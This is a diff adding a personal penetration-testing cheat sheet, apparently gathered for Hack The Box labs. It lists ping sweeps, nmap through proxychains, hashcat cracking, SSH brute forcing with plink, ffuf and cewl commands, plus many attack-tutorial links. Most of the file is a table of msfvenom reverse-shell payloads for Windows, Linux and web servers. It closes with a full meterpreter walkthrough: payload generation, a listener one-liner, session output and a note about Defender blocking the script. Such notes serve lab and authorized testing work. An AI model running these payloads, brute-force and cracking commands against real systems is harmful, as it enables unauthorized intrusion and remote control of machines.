@@ -1,0 +1,260 @@
+Ping Sweep
+
+for i in {1..254} ;do (ping -c 1 10.10.110.$i | grep "bytes from" |  cut -d " " -f 4 | cut -d ":" -f 1 &);done
+
+NMAP scans:
+
+quick:
+proxychains nmap 172.16.1.0/24 -sT -Pn -n --top-ports=10 --disable-arp-ping
+
+Common ports:
+proxychains nmap -sT -sC -sV -p 21,22,23,25,53,88,80,137,139,389,445,1080,3306,3389,5985,10000 172.16.2.5
+
+Hashcat
+
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+For Linux Hashes:
+.\hashcat64.exe -m 1800 -a 0 --hwmon-temp-abort=100 .\hashes\hash-offshore-123.txt .\rockyou.txt
+
+For Windows hashes:
+
+NTLMv1:
+
+
+SQLMap
+
+https://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/
+
+https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/
+
+https://community.netwitness.com/t5/netwitness-community-blog/from-sql-injection-to-webshell/ba-p/521012
+
+https://secnhack.in/take-meterpreter-of-website-using-sqlmap-os-shell/
+
+
+LinPEAS
+
+https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md
+
+
+John the Ripper
+
+https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf
+
+CrackMapExec
+
+https://wiki.porchetta.industries/news-2022/indestructible-g0thm0g
+https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
+
+
+
+SSH Brute Forcing using PLINK or PUTTY
+https://www.infosecmatter.com/ssh-brute-force-attack-tool-using-putty-plink-ssh-putty-brute-ps1/
+
+ ssh-putty-brute -h 172.16.2.101 -p 22 -u (gc .\usernames.txt) -pw (gc .\passwords-scrub.txt)
+Get-Content ssh-putty-brute.log | Select-String True
+
+Static Binaries
+https://github.com/andrew-d/static-binaries
+
+Hydra
+https://www.pwndefend.com/2018/07/24/hail-hydra-rdp-brute-forcing-with-hydra/
+
+https://linuxhint.com/bruteforce_ssh_ftp/
+
+Jenkins
+https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/jenkins.md
+https://github.com/Accenture/jenkins-attack-framework
+https://github.com/gquere/pwn_jenkins
+
+FFUF
+https://cheatsheet.haax.fr/web-pentest/tools/ffuf/
+
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.110.124:80/FUZZ -v -c -mc all -fc 200.301,200,302
+
+Cewl
+
+cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > dict.txt
+cewl -w log -m 3 -d 1 http://ADDRESS/
+• – in log  is a result file with dictionary entries,
+• -m 3  is the minimum length of the word to be added to the dictionary,
+• -d 1  depth of search penetration ( recursive entering URLs found ).
+
+https://www.hackingarticles.in/a-detailed-guide-on-cewl/
+https://kalitut.com/cewl-custom-word-list-generator/
+https://www.kali.org/tools/cewl/
+https://www.geeksforgeeks.org/cewl-tool-creating-custom-wordlists-tool-in-kali-linux/
+
+Kerbrute
+https://github.com/ropnop/kerbrute/releases
+
+Windows Privesc
+https://gist.github.com/sckalath/8dacd032b65404ef7411
+
+MySQL
+
+https://www.hackingarticles.in/penetration-testing-on-mysql-port-3306/
+
+https://devhints.io/mysql
+
+http://0xma.com/hacking/toby_crack_mysql_hashes.html
+
+Pentesting Book
+
+https://book.ethicalhackinghtb.xyz/
+
+Full TTY
+
+Static Binaries
+
+
+
+Medusa
+
+
+
+Potato Attacks
+
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
+
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc
+
+PowerCat
+
+https://www.hackingarticles.in/powercat-a-powershell-netcat/
+
+MSSQL Server Pentesting and Privesc
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+
+https://github.com/atthacks/mssql-secadmin-privesc
+
+MSFVenom Payload Cheatsheet
+
+https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+
+Non-Meterpreter Binaries
+Staged Payloads for Windows
+
+| x86 | msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe |
+| x64 | msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe |
+
+Stageless Payloads for Windows
+
+| x86 | msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe |
+| x64 | msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe |
+
+Staged Payloads for Linux
+
+| x86 | msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf |
+| x64 | msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf |
+
+Stageless Payloads for Linux
+
+| x86 | msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf |
+| x64 | msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf |
+
+
+Non-Meterpreter Web Payloads
+
+| asp | msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp |
+| jsp | msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp |
+| war | msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war |
+| php | msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php |
+
+
+Meterpreter Binaries
+Staged Payloads for Windows
+
+| x86 | msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe |
+| x64 | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe |
+
+Stageless Payloads for Windows
+
+| x86 | msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe |
+| x64 | msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe |
+
+
+Staged Payloads for Linux
+
+| x86 | msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf |
+| x64 | msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf |
+
+Stageless Payloads for Linux
+
+| x86 | msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf |
+| x64 | msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf |
+
+
+
+Meterpreter Web Payloads
+
+| asp | msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp |
+| jsp | msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp |
+| war | msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war |
+| php | msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php |
+
+
+meterpreter reverse shell with powershell
+1 Create Shell
+root@kali:~/htb# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.178.16 LPORT=443 -f psh -o meterpreter-64.ps1
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of psh file: 3255 bytes
+Saved as: meterpreter-64.ps1
+
+2 Setup listener
+msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.178.16; set lport 443; set ExitOnSession false; exploit -j"3. Interact
+# cowsay++
+____________
+< metasploit >
+------------
+\ ,__,
+\ (oo)____
+(__) )\
+||--|| *
+
+
+=[ metasploit v4.17.25-dev ]
++ -- --=[ 1828 exploits - 1033 auxiliary - 318 post ]
++ -- --=[ 541 payloads - 44 encoders - 10 nops ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+payload => windows/x64/meterpreter/reverse_tcp
+lhost => 192.168.178.16
+lport => 443
+ExitOnSession => false
+[*] Exploit running as background job 0.
+
+[*] Started reverse TCP handler on 192.168.178.16:443 
+msf exploit(multi/handler) > [*] Sending stage (206403 bytes) to 192.168.178.10
+[*] Meterpreter session 1 opened (192.168.178.16:443 -> 192.168.178.10:53418) at 2018-11-21 14:27:09 -0500
+
+msf exploit(multi/handler) > sessions -l
+
+Active sessions
+===============
+
+Id Name Type Information Connection
+-- ---- ---- ----------- ----------
+1 meterpreter x64/windows HTB\administrator @ PUCKIE 192.168.178.16:443 -> 192.168.178.10:53418 (192.168.178.10)4.  if Windows Defender is enabled
+PS C:\PENTEST> C:\PENTEST\meterpreter-64.ps1
+At C:\PENTEST\meterpreter-64.ps1:1 char:1
++ $VlSIhDyrsor = @"
++ ~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
++ CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException
++ FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+
+PS C:\PENTEST>5. Summary: The the generated ps1 can be saved to disk, and is not detected as a virus , and runs succesfull creating a shell, but it can’t run with defender enabled on my windows 10 box.
+
+Full Output of PS Command
+
+ps -efww
+
+https://stackoverflow.com/questions/2159860/viewing-full-output-of-ps-command
+
